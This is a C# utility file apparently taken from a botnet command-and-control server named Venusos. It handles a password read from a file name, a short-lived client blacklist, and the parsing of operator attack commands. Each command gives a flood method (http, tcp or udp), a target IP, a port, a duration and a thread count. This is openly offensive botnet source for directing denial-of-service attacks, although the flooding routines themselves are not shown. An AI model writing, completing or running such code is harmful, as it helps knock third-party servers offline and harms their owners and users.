using System.Net;
using System.Net.Sockets;

namespace Venusos_Botnet_Server
{
    public class Tools
    {
        public static List<IPAddress> blacklistedTcpClients = new List<IPAddress>();
        public static IPAddress GetLocalIP()
        {
            string localIP;
            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
            {
                socket.Connect("8.8.8.8", 65530);
                IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                localIP = endPoint.Address.ToString();
            }
            return IPAddress.Parse(localIP);
        }
        public static void BlacklistTcpClient(TcpClient tcpClient)
        {
            IPAddress ip = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address;
            blacklistedTcpClients.Add(ip);
            Task.Run(() =>
            {
                Thread.Sleep(15000);
                blacklistedTcpClients.Remove(ip);
            });
        }
        public static bool IsBlacklisted(TcpClient tcpClient)
        {
            return blacklistedTcpClients.Contains(((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address);
        }
        public static string GetPassword()
        {
            string directory = Directory.GetCurrentDirectory();
            string file = Directory.GetFiles(directory, "*.password").FirstOrDefault(directory + "\\default.password");
            file = file.Substring(directory.Length + 1, file.Length - (directory.Length + 10));
            if (file == "default")
            {
                File.Create("default.password");
                Console.WriteLine("Rename default.password to [your password].password\n");
            }
            return file;
        }
        public static Command CreateCommand(string data)
        {
            string[] options = data.Split(" ");
            string error = null;

            if (options.Length < 6)
            {
                throw new Exception("Not enough arguments\n");
            }
            else if (options.Length > 6)
            {
                throw new Exception("Too many arguments\n");
            }

            Command command = new Command();

            if (!new List<string> { "http", "tcp", "udp" }.Contains(options[1]))
            {
                error += "unknown method\n";
            }
            else
            {
                command.Method = options[1];
            }

            try
            {
                command.IP = options[2];
            }
            catch
            {
                error += "wrong ip address\n";
            }

            try
            {
                command.Port = (Convert.ToInt32(options[3]) is > 0) ? Convert.ToInt32(options[3]) : throw new Exception();
            }
            catch
            {
                error += "wrong port\n";
            }

            try
            {
                command.Duration = (Convert.ToInt32(options[4]) is > 0) ? Convert.ToInt32(options[4]) : throw new Exception();
            }
            catch
            {
                error += "wrong duration\n";
            }

            try
            {
                command.Threads = (Convert.ToInt32(options[5]) is > 0) ? Convert.ToInt32(options[5]) : throw new Exception();
            }
            catch
            {
                error += "wrong threads ammount\n";
            }

            if (error is null)
            {
                return command;
            }
            else
            {
                throw new Exception(error);
            }
        }
    }
}
